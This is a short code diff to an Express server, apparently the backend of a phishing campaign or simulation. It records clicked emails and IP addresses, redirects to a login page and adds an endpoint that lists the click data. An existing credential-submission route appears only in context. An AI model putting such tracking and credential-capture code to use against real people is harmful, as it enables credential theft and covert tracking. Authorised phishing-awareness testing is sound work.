@@ -77,13 +77,17 @@ app.get("/track-click", async (req, res) => {
   }
 
   try {
-    await PhishingClick.create({ email, ipAddress: req.ip });
-    res.redirect("/login.html");
+    const ip =
+      req.headers["x-forwarded-for"]?.split(",")[0] || req.socket.remoteAddress;
+
+    await PhishingClick.create({ email, ipAddress: ip });
+    res.redirect("/login.html"); // Or any final destination
   } catch (error) {
     console.error(error);
     res.status(500).send("Error tracking click");
   }
 });
+
 
 // Get all phishing click data
 app.get("/clicks", async (req, res) => {
@@ -122,6 +126,16 @@ app.post("/submit-credentials", async (req, res) => {
   } catch (err) {
     console.error("Error saving credentials:", err);
     res.status(500).json({ error: "Server error" });
+  }
+});
+
+app.get("/api/phishing-clicks", async (req, res) => {
+  try {
+    const clicks = await PhishingClick.find().sort({ timestamp: -1 }); // latest first
+    res.json(clicks);
+  } catch (error) {
+    console.error("Error fetching click data:", error);
+    res.status(500).json({ error: "Failed to fetch click data" });
   }
 });
 
